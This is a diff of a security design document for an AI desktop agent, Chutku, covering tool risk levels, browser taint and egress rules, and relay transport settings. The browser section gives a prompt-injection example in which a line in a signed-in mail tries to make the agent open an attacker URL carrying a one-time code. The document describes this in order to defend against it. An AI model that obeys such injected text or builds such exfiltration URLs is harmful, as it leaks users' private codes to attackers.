@@ -26,11 +26,11 @@ Every tool call goes through `Runtime.run`:
 6. **Execute, then verify** independently. Only `PASS` counts as done.
 7. **Logging:** each step goes to the event trace (SQLite) and the hash-chained action log (`data/actions.log.jsonl`, rotated at 5 MB with a continuous chain).
 
-### Risk levels and tools (238 registered, plus 144 app actions)
+### Risk levels and tools (239 registered, plus 144 app actions)
 
 | Level | Count | Meaning |
 |---|---|---|
-| R0 observation | 89 | reads only |
+| R0 observation | 90 | reads only |
 | R1 reversible | 79 | easily undone (open apps or pages, window and media control) |
 | R2 data modification | 30 | changes data, with runtime undo where available |
 | R3 external side effect | 33 | apps.close, apps.quit, browser.act_risky, browser.workflow, code.build_project, code.run_python, desktop.act_risky, email.send, evolve.approve, files.organize, input.click, input.type_text, keyboard.keys, keyboard.press_enter, message.send, mouse.click, mouse.drag, process.launch, remote.arm, remote.enable, screen.click_risky, settings.theme_restore, settings.theme_set, skill.approve, system.volume_restore, system.volume_set, uia.expand, uia.invoke, uia.scroll, uia.select, uia.set_value, windows.close, windows.close_this |
@@ -62,11 +62,14 @@ tools` from `tools/package-lock.json` (npm integrity hashes), run as separate pr
   through UI Automation patterns only (strict headless: never `--headed`, no mouse, no keystrokes, no focus
   stealing by Chutku). A ref is accepted only if a look in the last 3 minutes returned it. Typed text goes to the CLI
   on stdin, never on its command line. Window text is untrusted (TAINTING) and private (PRIVATE).
-- `browser.look` / `browser.act` / `browser.type` (agent-browser) drive a dedicated Brave/Edge profile
+- `browser.open` / `browser.look` / `browser.act` / `browser.type` (agent-browser) drive a dedicated Brave/Edge profile
   (`data/browser-profile`), headless. The owner signs in once with `chutku.cli browser login`, which opens that
-  profile as a plain browser with no automation attached; the everyday profile is never touched. Page text is
-  untrusted (TAINTING). Clicks on what the page offers are not network egress; `browser.look url=` and
-  `browser.type` (fill, Enter) are, so after private data was read in the task they ask. Local and private
+  profile as a plain browser with no automation attached; the everyday profile is never touched. Signed-in pages
+  (mail, orders) are untrusted and private (TAINTING and PRIVATE). `browser.open url=` and `browser.type` (fill,
+  Enter) are network egress, so after any private read they ask: an injected line in a mail cannot make Chutku
+  open `https://evil.example/?d=<OTP>` on its own (release review 2026-11-07, test
+  `SignedInPagesArePrivateTest`). Re-reading the open page (`browser.look`) and clicking what the page offers
+  (`browser.act`) are not egress. Local and private
   addresses ask first; `file://` access is off. Commands go through `batch` with JSON on stdin. The daemon stops
   after 10 idle minutes. `browser.act`/`browser.type` need the `browser.input` capability (not granted by default).
 
@@ -157,7 +160,7 @@ A test (`tests/test_taint_v2.py`) fails if any name in these lists is not a real
   - only GET/POST to `/api/*` is replayed, on the phone server over loopback, with that server's per-run secret (`X-Chutku-Relay`, compared in constant time; loopback only);
   - such a request is the `relay` device: rate limit, its PIN (set at setup; 5 wrong revoke it) for approvals, screen and control, laptop-only steps, and control armed only at the laptop all apply as for a paired phone;
   - CSRF is not used, because a bearer token is not sent by a browser on its own.
-- **Transport:** the laptop refuses a plain-http relay unless it is loopback or a private address. The relay must sit behind HTTPS; with `--behind-proxy`, sign-up limits count real clients through X-Forwarded-For. It sees the forwarded content (screen frames included). End-to-end encryption is not done yet.
+- **Transport:** the laptop refuses a plain-http relay unless it is loopback or a private address. The relay listens on 127.0.0.1 by default and refuses plain HTTP on any other address unless `--tls-cert`, `--behind-proxy` or `--home-network` is given; with `--behind-proxy`, sign-up limits count real clients through X-Forwarded-For, believed only from a proxy on the same machine. It sees the forwarded content (screen frames included). End-to-end encryption is not done yet.
 - **Replies:** a reply is kept only for a request of the same account that is still waiting. A late reply, or one from another account, is dropped.
 
 ## 4c. What Chutku learns about the owner (2026-11-01)
